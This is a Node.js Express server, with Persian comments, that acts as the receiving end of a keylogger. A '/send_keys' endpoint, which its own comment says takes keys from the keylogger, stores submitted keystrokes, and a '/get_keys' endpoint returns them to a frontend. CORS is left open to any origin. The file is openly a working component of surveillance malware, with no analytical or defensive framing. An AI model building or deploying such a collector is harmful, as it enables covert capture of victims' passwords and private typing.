const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname)); // دسترسی به index.html

// ذخیره داده‌ها
let keysData = [];

// Endpoint برای دریافت کلیدها از Keylogger
app.post("/send_keys", (req, res) => {
    const { keys } = req.body;
    if (keys) {
        keysData.push(keys);
    }
    res.json({ status: "ok" });
});

// Endpoint برای دریافت داده‌ها برای Frontend
app.get("/get_keys", (req, res) => {
    res.json(keysData);
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
